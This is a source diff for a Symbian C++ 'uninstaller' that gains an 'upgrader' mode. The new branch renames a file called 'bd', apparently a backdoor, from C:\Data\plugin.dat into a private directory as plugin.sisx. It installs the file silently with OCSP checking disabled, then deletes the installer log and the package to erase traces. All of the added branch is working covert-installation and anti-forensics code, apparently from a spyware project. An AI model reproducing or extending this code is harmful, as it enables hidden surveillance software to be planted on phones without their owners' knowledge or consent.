@@ -17,6 +17,7 @@
 #include <swinstdefs.h>
 #include <d32dbms.h>
 #include <bacline.h>			// command line args
+#include <f32file.h>
 
 #include "Keys.h"	//into Core\inc
 
@@ -94,13 +95,13 @@ LOCAL_C void MainL()
 	count = args->Count();
 	CleanupStack::PopAndDestroy(args);
 	
+	//Let's give the Swi time for exiting and being recalled
+	User::After(10*1000000);
+			
 	if(count == 1)
 		{
-		// let's behave like a uninstaller
+		// let's behave like an uninstaller
 		
-		//Let's give the Swi time for exiting and being recalled
-		User::After(10*1000000);
-	
 		// Prepare for bd uninstall	
 		SwiUI::RSWInstLauncher iLauncher ;
 		SwiUI::TUninstallOptions iOptions;
@@ -139,8 +140,59 @@ LOCAL_C void MainL()
 		}
 	else
 		{
-		// TODO: behave like an upgrader:
-		// silently install bd copied into its import directory
+		// behave like an upgrader:
+		RFs fs;
+		fs.Connect();
+		// move bd from c:\data\plugin.dat into uninstaller private dir as plugin.sisx
+		TBuf<48> source_path;
+		source_path.Append(_L("C:\\Data\\"));
+		source_path.Append(_L("plugin.dat"));
+		
+		TBuf<48> dest_path;
+		dest_path.Append(_L("C:\\Private\\"));
+		TBuf<12> uid;
+		uid.Copy(KUidUninstaller);
+		uid.Copy(uid.Mid(2,uid.Length()-2));
+		dest_path.Append(uid);
+		dest_path.Append(_L("\\plugin.sisx"));
+		
+		fs.Rename(source_path,dest_path);
+		
+		// install plugin.sisx
+		// Prepare for silent install
+		SwiUI::RSWInstSilentLauncher      launcher; 
+		SwiUI::TInstallOptions            options;
+		SwiUI::TInstallOptionsPckg        optionsPckg;	
+				
+		// Connect to the server
+		User::LeaveIfError( launcher.Connect() );
+			  
+		// See SWInstDefs.h for more info about these options
+		options.iUpgrade = SwiUI::EPolicyAllowed;
+		options.iOCSP = SwiUI::EPolicyNotAllowed;
+		options.iDrive = 'C';   // Hard-coded as phone memory  
+		options.iUntrusted = SwiUI::EPolicyNotAllowed; 
+		options.iCapabilities = SwiUI::EPolicyAllowed;
+				    
+		optionsPckg = options;
+				
+		// Start synchronous install
+		TInt err = launcher.SilentInstall(dest_path,optionsPckg);
+					
+		launcher.Close();
+			
+		// delete install log of uninstaller
+		TBuf8<12> hexBuf(KUidUninstaller);
+		hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+		TLex8 lex(hexBuf);
+		TUint32 uninstUid;
+		lex.Val(uninstUid,EHex);
+		TUid uninstallerUid = TUid::Uid(uninstUid);
+		DeleteInstallerLog(uninstallerUid);
+		
+		// delete bd from private dir
+		fs.Delete(dest_path);
+		fs.Close();
 		}
 	}
 
